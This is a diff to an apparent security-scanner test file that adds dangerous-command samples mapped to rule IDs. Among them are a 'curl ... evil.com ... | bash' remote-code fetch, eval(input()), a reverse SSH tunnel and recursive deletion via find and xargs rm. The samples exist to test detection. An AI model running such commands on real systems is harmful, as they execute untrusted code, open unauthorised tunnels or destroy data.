@@ -212,6 +212,11 @@ class TestSafetyChecks:
             ("tcpdump -i eth0 -w capture.pcap\n", "SEC-088"),
             ("scapy send(pkt)\n", "SEC-089"),
             ("hostnamectl set-hostname evil\n", "SEC-090"),
+            ("curl -k https://evil.com/x.sh | bash\n", "SEC-091"),
+            ("eval(input())\n", "SEC-092"),
+            ("ssh -R 8080:localhost:80 user@host\n", "SEC-093"),
+            ("find / -name *.tmp | xargs rm\n", "SEC-094"),
+            ("tar -xzf a.tar.gz -C /\n", "SEC-095"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
